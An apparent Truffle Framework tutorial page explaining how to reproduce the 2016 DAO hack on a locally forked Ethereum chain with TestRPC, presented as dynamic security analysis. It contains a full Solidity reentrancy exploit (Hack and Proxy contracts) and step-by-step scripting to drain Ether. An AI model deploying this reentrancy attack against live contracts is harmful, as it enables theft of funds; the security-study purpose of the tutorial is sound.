

<!doctype html>
<html lang="en">
    <head>
    <meta charset="utf-8">
  
  
    <!-- Fallback for Font family below in noscript [*] -->
    <script type="text/javascript">
      WebFontConfig = {
        google: { families: [ 'Oswald:300,400,700',  'Open+Sans:400,700' ] }
      };
      (function() {
        var wf = document.createElement('script');
        wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
        '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
        wf.type = 'text/javascript';
        wf.async = 'true';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(wf, s);
      })(); </script>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Your Ethereum Swiss Army Knife">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="news_keywords" content="solidity, dapps, contracts, smart contracts" />
    <meta name="standout" content="http://truffleframwork.com" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta property="og:site_name" content="Truffle Framework" />
    <meta property="og:description" content="Your Ethereum Swiss Army Knife" />
    <meta property="og:title" content="TruffleFramework.com - Truffle Framework" />
    <meta property="og:url" content="http://truffleframwork.com" />
    <meta property="og:type" content="article" />
    <meta property="og:image" content="https://github.com/trufflesuite/trufflesuite.github.io/raw/master/images/twitter_card.jpg" />

    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="Truffle Framework" />
    <meta name="twitter:title" content="TruffleFramework.com - Truffle Framework" />
    <meta name="twitter:description" content="Your Ethereum Swiss Army Knife" />
    <meta name="twitter:creator" content="Truffle Framework" />
    <meta name="twitter:domain" content="truffleframework.com" />
    <meta name="twitter:image:src" content="https://github.com/trufflesuite/trufflesuite.github.io/raw/master/images/twitter_card.jpg" />

    
    

    <title>TruffleFramework.com | Truffle Framework</title>

    <link rel="author" href="humans.txt" />

    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">

    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="application-name" content="Truffle Framework">
    <link rel="icon" sizes="192x192" href="images/touch/chrome-touch-icon-192x192.png">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Web Starter Kit">
    <link rel="apple-touch-icon" href="images/touch/apple-touch-icon.png">

    <!-- Tile icon for Win8 (144x144 + tile color) -->
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <link rel="stylesheet" href="/styles/main.css">
    
      <noscript>
        <!-- [*] Web fonts for no-js -->
        <link href='http://fonts.googleapis.com/css?family=Oswald:300,400,700%7COpen+Sans:400,700' rel='stylesheet' type='text/css'>
      </noscript>
    
  </head>

  <body>
    <main>
      <section class="Tutorials">
  <nav class="navbar navbar-default navbar-fixed-top">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">
        
<svg class="truffle-logo" width="100%" height="100%" viewBox="655 52 131 128" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <polyline id="path-1" points="0 0.426 130.715 0.426 130.715 128 0 128"></polyline>
        <polygon id="path-3" points="0 0.426 130.715 0.426 130.715 128 0 128"></polygon>
    </defs>
    <g id="Logo" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(655.000000, 52.000000)">
        <!-- Truffle Logo -->

        <path d="M100.8574,99.9258 C100.8574,102.0878 82.8804,103.8378 65.6344,103.8378 C48.3884,103.8378 30.4124,102.0878 30.4124,99.9258 C30.4124,97.7658 48.3884,96.0138 65.6344,96.0138 C82.8804,96.0138 100.8574,97.7658 100.8574,99.9258" id="Fill-1" fill="#E6E7E8"></path>
        <g id="Group-5">
            <mask id="mask-2" fill="white">
                <use xlink:href="#path-1"></use>
            </mask>
            <g id="Clip-4"></g>
            <path d="M117.7813,50.4258 C117.7813,78.0398 95.3943,100.4258 67.7813,100.4258 C51.0803,100.4258 36.2913,92.2378 27.2113,79.6558 C21.2773,71.4358 18.9393,61.3388 18.9403,50.4258 C18.9403,35.2618 24.5313,21.6738 35.1913,12.5048 C43.9433,4.9768 55.3313,0.4258 67.7813,0.4258 C95.3943,0.4258 117.7813,22.8118 117.7813,50.4258" id="Fill-3" fill="#5E464D" mask="url(#mask-2)"></path>
        </g>
        <path d="M53.8936,94.4175 C55.9346,95.0525 62.7846,97.0835 63.0116,94.9175 C63.1366,93.7305 59.5436,92.6085 54.6076,90.1675 C47.5826,86.6945 41.1946,82.2065 35.5246,76.8335 C29.1906,70.8335 22.6076,61.2925 21.8576,47.2925 C21.0476,32.1835 26.6756,19.8005 36.1896,11.6595 C24.9566,20.8285 17.7816,34.7795 17.7816,50.4105 C17.7816,61.3545 21.2466,71.4225 27.2106,79.6565 C29.1966,81.4595 31.3236,83.1725 33.4116,84.6675 C39.0236,88.6875 47.1746,92.3275 53.8936,94.4175" id="Fill-6" fill="#FFFFFF"></path>
        <path d="M118.4668,38.9644 C115.3988,24.5534 105.8718,14.4624 93.1328,7.3374 C102.8738,14.2754 116.5888,29.0214 108.5048,42.0234 C101.6488,52.4484 84.9838,50.4034 75.8768,45.4644 C65.0498,39.5924 51.4838,26.3724 64.8638,13.4504 C73.5248,5.0894 101.1068,14.4644 96.2358,26.9644 C93.4048,34.2294 82.3948,32.6164 77.4388,29.0604 C73.7848,26.4384 70.7128,21.9294 72.3408,17.2754 C72.8628,15.7824 72.7868,13.4654 70.6798,15.1704 C69.1068,16.4434 68.3158,18.5384 68.0398,20.4864 C65.7358,36.7834 94.7688,49.4154 103.3798,33.6494 C107.8508,25.4644 100.6068,13.5894 91.4888,8.7144 C84.6208,5.0424 77.4998,2.4644 68.7578,3.0894 C54.7818,4.0884 43.0478,12.8314 41.5788,27.1154 C40.1228,41.2914 49.5978,54.0844 60.7748,61.7264 C72.5128,69.7534 88.3168,75.0464 102.7678,70.2574 C115.7198,65.9644 121.0708,51.0974 118.4668,38.9644" id="Fill-8" fill="#FFFFFF"></path>
        <path d="M100.2344,27.9272 C101.6234,18.5872 93.1804,12.1762 85.3844,9.2612 C76.1884,5.8212 64.0464,7.3312 57.3504,14.9472 C52.4384,20.5352 52.7724,28.6592 55.2964,35.2182 C59.1144,45.1422 67.7354,52.3152 77.7704,55.4112 C84.9014,57.6132 93.5214,58.5732 100.7504,56.2472 C111.2874,52.8582 114.7194,41.8662 112.5424,31.7982 C112.0734,29.6302 111.3594,27.4952 110.4064,25.4932 C109.0764,22.6982 104.9984,17.0422 110.6194,23.9312 C111.2334,24.6842 111.7204,25.5142 112.2424,26.3332 C113.4294,28.2002 114.2954,30.3142 114.9784,32.4102 C118.0444,41.8102 115.6374,52.7752 107.1294,58.4472 C100.6124,62.7912 92.3294,63.3062 84.7694,62.2222 C74.6384,60.7702 65.0854,55.8372 58.4524,47.9822 C52.3874,40.8022 48.2554,30.4882 50.7474,21.0642 C52.5704,14.1662 58.1724,9.0192 64.8764,6.8492 C73.3604,4.1012 82.6984,5.3762 90.3444,9.8372 C94.1684,12.0682 97.6714,15.1532 99.6164,19.1932 C100.4904,21.0072 100.9934,23.0192 101.0114,25.0352 C101.0184,25.8482 100.9834,26.6872 100.8214,27.4862 C100.7684,27.7782 100.1484,28.6072 100.2344,27.9272" id="Fill-10" fill="#3FE0C5"></path>
    </g>
</svg>

<svg class="truffle-wordmark" width="100%" height="100%" viewBox="655 52 131 128" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <polyline id="path-1" points="0 0.426 130.715 0.426 130.715 128 0 128"></polyline>
        <polygon id="path-3" points="0 0.426 130.715 0.426 130.715 128 0 128"></polygon>
    </defs>
    <g id="Logo" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(655.000000, 52.000000)">
        <!-- Truffle Wordmark -->

        <polygon id="Fill-12" fill="#5F464D" points="0 108.8555 10.321 108.8555 10.321 112.3595 6.919 112.3595 6.919 127.5295 3.313 127.5295 3.313 112.3595 0 112.3595"></polygon>
        <path d="M22.8096,116.1543 L24.9236,116.1543 C26.0536,116.1543 26.8326,116.0063 27.2586,115.7093 C27.6846,115.4123 27.8976,114.9203 27.8976,114.2303 C27.8976,113.8243 27.7916,113.4683 27.5806,113.1683 C27.3706,112.8673 27.0876,112.6503 26.7336,112.5173 C26.3796,112.3863 25.7296,112.3203 24.7846,112.3203 L22.8096,112.3203 L22.8096,116.1543 Z M19.2546,108.8553 L24.0216,108.8553 C26.0836,108.8553 27.5536,109.0393 28.4286,109.4063 C29.3026,109.7753 30.0066,110.3863 30.5396,111.2423 C31.0716,112.0953 31.3386,113.1073 31.3386,114.2753 C31.3386,115.5043 31.0436,116.5293 30.4556,117.3533 C29.8686,118.1793 28.9816,118.8043 27.7966,119.2263 L32.2206,127.5293 L28.3346,127.5293 L24.1356,119.6213 L22.8096,119.6213 L22.8096,127.5293 L19.2546,127.5293 L19.2546,108.8553 Z" id="Fill-14" fill="#5F464D"></path>
        <g id="Group-18">
            <mask id="mask-4" fill="white">
                <use xlink:href="#path-3"></use>
            </mask>
            <g id="Clip-17"></g>
            <path d="M41.2588,108.8555 L44.8258,108.8555 L44.8258,120.9315 C44.8258,121.9705 44.9168,122.7075 45.0988,123.1385 C45.2808,123.5705 45.5808,123.9145 46.0008,124.1715 C46.4188,124.4295 46.9248,124.5585 47.5178,124.5585 C48.1438,124.5585 48.6838,124.4165 49.1358,124.1265 C49.5888,123.8395 49.9028,123.4745 50.0748,123.0315 C50.2488,122.5855 50.3358,121.7385 50.3358,120.4865 L50.3358,108.8555 L53.9038,108.8555 L53.9038,119.9885 C53.9038,121.8675 53.7978,123.1715 53.5858,123.8985 C53.3738,124.6265 52.9698,125.3305 52.3738,126.0055 C51.7768,126.6835 51.0888,127.1855 50.3108,127.5095 C49.5318,127.8355 48.6258,128.0005 47.5938,128.0005 C46.2388,128.0005 45.0618,127.6875 44.0578,127.0665 C43.0558,126.4435 42.3378,125.6665 41.9058,124.7305 C41.4748,123.7945 41.2588,122.2145 41.2588,119.9885 L41.2588,108.8555 Z" id="Fill-16" fill="#5F464D" mask="url(#mask-4)"></path>
        </g>
        <polygon id="Fill-19" fill="#5F464D" points="64.6611 108.8555 73.9281 108.8555 73.9281 112.3205 68.1891 112.3205 68.1891 115.7105 73.9281 115.7105 73.9281 119.1255 68.1891 119.1255 68.1891 127.5295 64.6611 127.5295"></polygon>
        <polygon id="Fill-21" fill="#5F464D" points="83.7676 108.8555 93.0356 108.8555 93.0356 112.3205 87.2966 112.3205 87.2966 115.7105 93.0356 115.7105 93.0356 119.1255 87.2966 119.1255 87.2966 127.5295 83.7676 127.5295"></polygon>
        <polygon id="Fill-23" fill="#5F464D" points="102.8398 108.8555 106.3948 108.8555 106.3948 124.1405 111.5738 124.1405 111.5738 127.5295 102.8398 127.5295"></polygon>
        <polygon id="Fill-25" fill="#5F464D" points="120.5205 108.8555 130.7145 108.8555 130.7145 112.3345 124.0495 112.3345 124.0495 115.7105 130.7145 115.7105 130.7145 119.1255 124.0495 119.1255 124.0495 124.0395 130.7145 124.0395 130.7145 127.5295 120.5205 127.5295"></polygon>
    </g>
</svg>

      </a>
    </div>
    <div id="navbar" class="navbar-collapse collapse">
      <ul class="nav navbar-nav navbar-right">
        <li><a href="/">Home</a></li>
        <li><a href="/docs">Documentation</a></li>
        <li><a href="/boxes">Boxes</a></li>
        <li><a href="/blog">Blog</a></li>
        <li><a href="/tutorials">Tutorials</a></li>
        <li><a href="/support">Support</a></li>
        <li><a href="/community">Community</a></li>
      </ul>
    </div><!--/.nav-collapse -->
  </div><!--/.container-fluid -->
</nav>


  <section class="MainContent">
    <div class="container-fluid">
      <div class="row">
        <h1><a name="chain-forking-and-dynamic-analysis-br-exploiting-the-dao" class="anchor" href="#chain-forking-and-dynamic-analysis-br-exploiting-the-dao"><span class="header-link" style="z-index: 9999999185">&nbsp;</span></a>Chain Forking and Dynamic Analysis:<br> Exploiting The DAO</h1><p>Since The DAO <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">was exploited</a>, the Ethereum community has swarmed into action. From hardening our most popular language with the <a href="https://github.com/ethereum/solidity/releases/tag/v0.4.0">latest Solidity release</a> to visualizing possible security vulnerabilities with <a href="https://github.com/raineorshine/solgraph">SolGraph</a>, the community has made security its number one focus. There are many ways in which to discover security threats, and most were discussed during Devcon 2 in Shanghai. The <a href="https://github.com/ethereumjs/testrpc">ethereumjs-testrpc</a> authors have focused on one specifically, which we&#39;ll discuss here, called dynamic analysis through chain forking.</p>
<h2><a name="what-is-dynamic-analysis-" class="anchor" href="#what-is-dynamic-analysis-"><span class="header-link" style="z-index: 9999999184">&nbsp;</span></a>What is Dynamic Analysis?</h2><p>Dynamic Analysis is the process of executing code and data in real-time with the hope of finding issues during execution. It&#39;s a similar process to <a href="http://www.satisfice.com/articles/what_is_et.shtml">exploratory testing</a>, with the same goals, but perhaps more technical.</p>
<p>Dynamic analysis on the Ethereum blockchain has historically been costly at worst and tedious at best. If you were to perform dynamic analysis on the live Ethereum chain, transactions would cost you hard-earned Ether, which might limit the tests you perform. Moving away from the live chain is possible, but it&#39;s a tedious process to move the live data over to a separate chain, and you&#39;d have to perform this process multiple times if you end up mucking with the chain state during testing.</p>
<h2><a name="hello-testrpc" class="anchor" href="#hello-testrpc"><span class="header-link" style="z-index: 9999999183">&nbsp;</span></a>Hello, TestRPC</h2><p>In early September, <a href="https://github.com/ethereumjs/testrpc">ethereumjs-testrpc</a> released its <code>--fork</code> feature meant to solve the issues with dynamic analysis on the live chain (or any chain, for that matter). It did so by allowing you to &quot;fork&quot; from the live chain &#8211; i.e., create a new blockchain that starts from the last block on the existing chain &#8211; allowing you to make transactions on the new chain without spending real Ether or changing the existing chain&#39;s state. What&#39;s more, you can reset the chain back to its original state by simply restarting the TestRPC. This feature has big implications for many other areas of development, but today we&#39;ll talk about how we can use it for dynamic analysis.</p>
<h2><a name="exploiting-the-dao" class="anchor" href="#exploiting-the-dao"><span class="header-link" style="z-index: 9999999182">&nbsp;</span></a>Exploiting The DAO</h2><p>One great feature of the TestRPC is that it&#39;s scriptable. Although this tutorial will show you how we exploited it, with the TestRPC&#39;s new <code>--fork</code> feature all you have to do is download the code and exploit it yourself, simply by running one command! You can find the full exploit code as a <a href="https://github.com/tcoulter/dao-truffle">Truffle project here</a>, and the original demo video below.</p>
<p>
<iframe width="711" height="400" src="https://www.youtube.com/embed/MLtsmnhiXCE" frameborder="0" allowfullscreen></iframe>
</p>

<h3><a name="overview-of-the-exploit" class="anchor" href="#overview-of-the-exploit"><span class="header-link" style="z-index: 9999999181">&nbsp;</span></a>Overview of the exploit</h3><p>The DAO exploit has many steps, and many of those steps are simply waiting for time to move forward. Here&#39;s a general overview of the steps we&#39;ll perform:</p>
<ol>
<li>Fork from the live chain at a block <em>just before</em> the DAO presale ended. We fork at this point in time to have as much Ether as we can to exploit (for example&#39;s sake).</li>
<li>Participate in the presale by buying DAO tokens.</li>
<li>Wait one day for the presale to end.</li>
<li>Deploy our Hack contract to the network that we will eventually use to exploit the DAO.</li>
<li>Transfer the DAO tokens we purchased to the hack contract.</li>
<li>Have our DAO contract make a split proposal, which is required to perform the exploit.</li>
<li>Vote yes on our own proposal (someone has to).</li>
<li>Wait a week for our proposal voting time to end (we end up waiting eight days for good measure).</li>
<li>Perform our split, which starts the hack.</li>
<li>Then continue it in a loop!</li>
</ol>
<h3><a name="aside-traveling-through-time" class="anchor" href="#aside-traveling-through-time"><span class="header-link" style="z-index: 9999999180">&nbsp;</span></a>Aside: Traveling through time</h3><p>In the above overview, there are a few steps that require us to wait <strong>days</strong> to complete. Don&#39;t worry: the TestRPC has features that allow us to jump forward in time, so waiting days for a single step will take mere milliseconds. Bon voyage!</p>
<h3><a name="step-1-forking-from-the-main-chain" class="anchor" href="#step-1-forking-from-the-main-chain"><span class="header-link" style="z-index: 9999999179">&nbsp;</span></a>Step 1: Forking from the main chain</h3><p>This step requires you to sync the live chain using <a href="https://github.com/ethereum/go-ethereum">go-ethereum</a> or <a href="http://ethdocs.org/en/latest/ethereum-clients/">any other Ethereum client</a>. Because we&#39;ll be forking from a previous state, you <strong>must sync the whole chain</strong>; you can&#39;t use the <code>--fast</code> option (or similar) to only sync the latest state. To keep this tutorial as succinct as possible, we&#39;ll leave syncing the chain up to you as the steps vary widely based on the client chosen and the environment where it&#39;s intended to be installed.</p>
<p>Once you have your client running, ensure it has an open RPC API running and available to you. For this example, we&#39;ll assume you have your client accepting requests on <code>http://localhost:8545</code>, the default for most clients.</p>
<p>To fork from the live chain, we first need to run an instance of the TestRPC, pointing it at the correct host and port. Remember: We&#39;re creating a programmable script that exploits The DAO, so you&#39;ll first need to install the required dependencies and include them within the script. We won&#39;t be writing the whole script here, but you can follow along via <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">the script on github</a>.</p>
<pre><code class="lang-javascript">var web3 = new Web3(TestRPC.provider({
  fork: &quot;http://localhost:8545@1599200&quot;
}));
</code></pre>
<p>Here, we create a new instance of the TestRPC, forking from a chain which accepts requests from <code>http://localhost:8545</code> (our live chain). As well, we tell it that we want to fork from <a href="https://etherscan.io/block/1599200">block 1599200</a>; this is a block that was mined right before the DAO presale ended.</p>
<h3><a name="step-2-participate-in-the-presale" class="anchor" href="#step-2-participate-in-the-presale"><span class="header-link" style="z-index: 9999999178">&nbsp;</span></a>Step 2: Participate in the presale</h3><p>Participating in the presale is just a matter of sending Ether to the DAO contract. We can use a normal transaction to do this. Below, we buy 90 ETH worth of DAO tokens:</p>
<pre><code class="lang-javascript">var DAO = DAOContract.at(&quot;0xbb9bc244d798123fde783fcc1c72d3bb8c189413&quot;);

web3.eth.sendTransaction({
  from: accounts[0],
  to: DAO.address,
  value: web3.toWei(90, &quot;Ether&quot;),
  gas: 90000
}, callback);
</code></pre>
<p>Note that the <code>accounts</code> array is populated by our script, which used <code>web3.eth.getAccounts()</code> to get a list of all available accounts provided to us by the TestRPC. As well, we&#39;ve pointed an instance of the DAO contract to the address <a href="https://etherscan.io/address/0xbb9bc244d798123fde783fcc1c72d3bb8c189413">0xbb9bc244d798123fde783fcc1c72d3bb8c189413</a>, which is the original DAO account and code.</p>
<p>Again, for example&#39;s sake we&#39;re using some shorthand, so please follow along <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">with the script on github</a>.</p>
<h3><a name="step-3-wait-for-the-presale-to-end" class="anchor" href="#step-3-wait-for-the-presale-to-end"><span class="header-link" style="z-index: 9999999177">&nbsp;</span></a>Step 3: Wait for the presale to end</h3><p>Since we forked to a block that was mined the day before the presale ended, we have to jump forward in time by at least a few hours to get past the presale deadline. We decided to jump a day by calling a special method provided by the TestRPC, <code>evm_increaseTime</code>:</p>
<pre><code class="lang-javascript">web3.currentProvider.sendAsync({
  jsonrpc: &quot;2.0&quot;,
  method: &quot;evm_increaseTime&quot;,
  params: [86400],  // 86400 seconds in a day
  id: new Date().getTime()
}, callback);
</code></pre>
<p>This will tell the TestRPC to alter its timestamp by <code>86400</code> seconds. This feature allows you to write tests that have a time component, and in our case allows us to continue executing code after a deadline is reached.</p>
<h3><a name="step-4-deploy-our-hack-contract-to-the-network" class="anchor" href="#step-4-deploy-our-hack-contract-to-the-network"><span class="header-link" style="z-index: 9999999176">&nbsp;</span></a>Step 4: Deploy our hack contract to the network</h3><p>This hack contract was written by me, but it was heavily influenced by <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">this writeup</a> written by Phil Daian from <a href="http://hackingdistributed.com/">Hacking, Distributed</a>. Many thanks go to him for such a clear writeup.</p>
<p>From Github: <a href="https://github.com/tcoulter/dao-truffle/blob/master/contracts/Hack.sol">./contracts/Hack.sol</a></p>
<pre><code class="lang-javascript">import &quot;DAOInterface.sol&quot;;

contract Proxy {
  DAOInterface DAO;
  address owner;

  function Proxy(address _dao) {
    owner = msg.sender;
    DAO = DAOInterface(_dao);
  }

  function empty() {
    if (msg.sender != owner) return;

    uint balance = DAO.balanceOf(this);
    DAO.transfer(owner, balance);
  }
}

contract Hack {
  uint public proposalID;
  DAOInterface public DAO;
  uint public calls_to_make;
  uint public calls;
  Proxy public proxy;

  function Hack(address _dao) {
    DAO = DAOInterface(_dao);
    calls = 0;
    proxy = new Proxy(_dao);
    calls_to_make = 1;
  }

  function makeSplitProposal() {
    // 0x93a80 == 604800 == 1 week in seconds
    bytes memory transactionData;
    proposalID = DAO.newProposal(this, 0x0, &quot;Lonely, so Lonely&quot;, transactionData, 0x93a80, true);
  }

  function voteYesOnProposal() {
    DAO.vote(proposalID, true);
  }

  function fillProxy() {
    uint balance = DAO.balanceOf(this);
    DAO.transfer(address(proxy), balance);
  }

  function splitDAO() {
    calls += 1;
    DAO.splitDAO(proposalID, this);
  }

  function runHack(uint _calls_to_make) {
    calls = 0;
    calls_to_make = _calls_to_make;
    proxy.empty();
    splitDAO();
  }

  function() {
    if (calls &lt; calls_to_make) {
      splitDAO();
    } else {
      fillProxy();
    }
  }
}
</code></pre>
<ul>
<li>First, this contract file contains two contracts: A Proxy contract, and a Hack contract. The Hack contract performs the splits, and is the main entity and address that exploits the DAO. The Proxy contract is a place for the Hack contract to stash its DAO tokens before they get flushed at the end of one run through the loop. Because they&#39;re stashed in a different address, the final iteration will have no DAO tokens to zero out, and thus we can continue the hack indefinitely.</li>
<li><code>makeSplitProposal()</code>, <code>voteYesOnProposal()</code>, and <code>splitDAO()</code> (when called on its own), are all functions required to set up the hack. Since the Hack contract is the main entity that holds the DAO tokens, it must perform this setup in order to execute the hack later.</li>
<li><code>fillProxy()</code> takes the Hack contract&#39;s DAO tokens and transfers them to the address of the Proxy contract, a vital part of making the hack indefinite. As well, <code>proxy.empty()</code> returns the tokens back to the Hack contract.</li>
<li><code>runHack()</code> gets the hack started, and the fallback function <code>function() {...}</code> runs the hack until we&#39;ve reached the maximum amount of calls we can make within our given gas limit.</li>
</ul>
<h3><a name="step-5-transfer-dao-tokens-to-hack-contract" class="anchor" href="#step-5-transfer-dao-tokens-to-hack-contract"><span class="header-link" style="z-index: 9999999175">&nbsp;</span></a>Step 5: Transfer DAO tokens to Hack contract</h3><p>Now that our Hack contract is deployed, we need to transfer the DAO balance from <code>accounts[0]</code> to our Hack contract so that it can exploit the hack. We do this by using our contract abstraction provided by Truffle:</p>
<pre><code class="lang-javascript">DAO.transfer(Hack.address, balances.accountDAO, {from: accounts[0]}).then(function() {
  callback();
}).catch(callback);
</code></pre>
<h3><a name="step-6-make-a-split-proposal" class="anchor" href="#step-6-make-a-split-proposal"><span class="header-link" style="z-index: 9999999174">&nbsp;</span></a>Step 6: Make a split proposal</h3><p>Making a split proposal is part of the DAO. A split proposal is a suggestion to all other DAO token holders that you should remove your Ether from the main DAO and create a DAO all your own. You can vote on this proposal to ensure it goes through, and after seven days if the split is approved by a majority of voters, you&#39;ll be able to move your Ether into your own DAO.</p>
<p>I found creating a split proposal rather confusing. Creating a split is similar to creating a normal proposal, but it requires much less data as input to the DAO&#39;s <code>newProposal()</code> function. Still, you must satisfy every input, and it took trial and error to figure out exactly what inputs would do the trick. I used a number of resources, including <a href="https://github.com/slockit/DAO/wiki/How-to-split-the-DAO">this wiki page</a>, <a href="https://github.com/slockit/DAO/wiki/How-to-create-a-proposal">this wiki page</a>, <a href="https://daowiki.atlassian.net/wiki/display/DAO/How+to+split+the+DAO%3A+Step-by-Step">this wiki page</a> as well as the <a href="https://github.com/tcoulter/dao-truffle/tree/master/contracts">DAO code itself</a> (to future developers, I&#39;d highly recommend encapsulating the complexity if you have two &quot;things&quot; of the same general type where one is far simpler than the other). Eventually I was able to find the right combination, and I put it in its own method in the Hack contract above. Now, creating my proposal was simply a matter of calling that single function:</p>
<pre><code class="lang-javascript">function makeSplitProposal() {
  // 0x93a80 == 604800 == 1 week in seconds
  bytes memory transactionData;
  proposalID = DAO.newProposal(this, 0x0, &quot;Lonely, so Lonely&quot;, transactionData, 0x93a80, true);
}
</code></pre>
<p>Couple points here:</p>
<ul>
<li>The first input is the recipient of the proposal &#8211; or in our case, the curator of the new DAO that&#39;s created &#8211; which is the Hack contract itself.</li>
<li><code>0x0</code> is the amount of Ether to send with the proposal. We&#39;re told to leave this blank when creating a split, which means to leave it zero if calling the function programmatically.</li>
<li><code>&quot;Lonely, so Lonely&quot;</code> is a short description of the proposal. This is the same description the original attacker used, so it&#39;s only fitting to use it ourselves as well.</li>
<li><code>transactionData</code> is any extra input used to call functions on the proposal&#39;s contract were this a real proposal. Since this is a split we&#39;re supposed to leave it blank, but the only way to do so is to create a new <code>bytes</code> type in memory and pass that empty type along.</li>
<li><code>0x93a80</code> is one week in seconds, converted to hexadecimal.</li>
<li><code>true</code> means we&#39;re actually splitting, and not creating a normal proposal.</li>
</ul>
<p>When I executed the above function from Javascript I also watched for the <code>ProposalAdded</code> event fired off by the DAO, which told me the id of the proposal created. You can see how I did that <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">in the script</a>.</p>
<h3><a name="step-7-vote-yes-on-the-proposal" class="anchor" href="#step-7-vote-yes-on-the-proposal"><span class="header-link" style="z-index: 9999999173">&nbsp;</span></a>Step 7: Vote yes on the proposal</h3><p>This is a simple function call. Like the <code>makeSplitProposal()</code> function above, the <code>voteYesOnProposal()</code> function was added to the Hack contract to ensure the Hack contract was the entity voting yes. Since it&#39;s encapsulated in the Hack contract, it&#39;s as simple as calling a single function from Javascript. We need only pass along the proposal id and our vote to ensure our vote is counted:</p>
<pre><code class="lang-javascript">function voteYesOnProposal() {
  DAO.vote(proposalID, true);
}
</code></pre>
<h3><a name="step-8-wait-a-week" class="anchor" href="#step-8-wait-a-week"><span class="header-link" style="z-index: 9999999172">&nbsp;</span></a>Step 8: Wait a week</h3><p>The minimum waiting period for a split proposal is one week. Since we created our proposal above with a waiting period of a week, we need to tell the TestRPC to jump forward that much time (in seconds). I&#39;ll leave that as an exercise for the reader, or you can just <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">review the script</a>.</p>
<h3><a name="step-9-perform-our-first-split" class="anchor" href="#step-9-perform-our-first-split"><span class="header-link" style="z-index: 9999999171">&nbsp;</span></a>Step 9: Perform our first split</h3><p>The hack itself is a continuous stream of split requests, however for our script we start by splitting the DAO once ourselves. We do this mostly for the purposes of the script so we can get the newly created DAO&#39;s address that we can later use to show our total bounty. We&#39;ve set up the hack contract to only make one split the first time we call <code>splitDAO()</code> (see <code>calls</code> and <code>calls_to_make</code>; <code>calls_to_make</code> defaulted to <code>1</code> when we deployed the contract). We need to enforce the amount of splits we intend to make because otherwise we&#39;d trigger the hack by continuing to make splits from the fallback function.</p>
<pre><code class="lang-javascript">function splitDAO() {
  calls += 1;
  DAO.splitDAO(proposalID, this);
}
</code></pre>
<p>Like when we created a proposal we also wait for an event here, this time the <code>Transfer</code> event, but again you can see how we did that <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">within the script</a>.</p>
<h3><a name="step-10-run-the-hack" class="anchor" href="#step-10-run-the-hack"><span class="header-link" style="z-index: 9999999170">&nbsp;</span></a>Step 10: Run the hack</h3><p>This is where things get interesting. We performed a significant setup in order to get to this point. Fortunately, all logic of the hack is contained within the Hack and Proxy contracts.</p>
<pre><code class="lang-javascript">function runHack(uint _calls_to_make) {
  calls = 0;
  calls_to_make = _calls_to_make;
  proxy.empty();
  splitDAO();
}

function() {
  if (calls &lt; calls_to_make) {
    splitDAO();
  } else {
    fillProxy();
  }
}
</code></pre>
<p>The execution logic looks like this:</p>
<ol>
<li>Call <code>runHack()</code> to start the hack. Here, we pass in the specific number of splits we want to execute to ensure we don&#39;t go over the gas limit. The Proxy contract is then emptied of all its DAO tokens, transferring them back to the Hack contract so they can be used to run the hack. Next, the <code>splitDAO()</code> function is called, eventually calling <code>DAO.splitDAO()</code>, which during execution attempts to give any reward from the split to the recipient of the proposal, our Hack contract. The reward in our case is zero, but it&#39;s the action of sending the reward &#8211; <code>_recipient.call.value(_amount)()</code> in <code>ManagedAccount.sol</code> &#8211; that enables us to perform the rest of the hack.</li>
<li>Sending the reward to the Hack contract triggers the Hack contract&#39;s fallback function. Here, the fallback function tracks how many splits it has made, and if it hasn&#39;t made too many, it then calls another split via the <code>splitDAO()</code> function. If it <em>has</em> called the expected amount of splits, it then sends the DAO tokens back to the Proxy contract before the main DAO can record the Hack contract&#39;s balance as zero.</li>
<li>The execution will loop in this way &#8211; split, fallback function, split, fallback function &#8211; until the preset number of splits have been made. The transaction then exits, is recorded as successful on the blockchain, and is run continuously by our script until the DAO is drained of all its Ether.</li>
</ol>
<p>You can see via <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">the script</a> where the balance goes. After each set of iterations &#8211; in our case, 26 iterations per set &#8211; you can see that Ether funnels from the old DAO to the new DAO and the DAO tokens that allowed us to perform the hack wind up back in the Proxy contract where they started. This is one of the amazing properties of this hack, in that you can run it indefinitely with the same DAO tokens you started with. Again, big thanks to the fine folks at <em>Hacking, Distributed</em> for this <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">revelation</a>.</p>
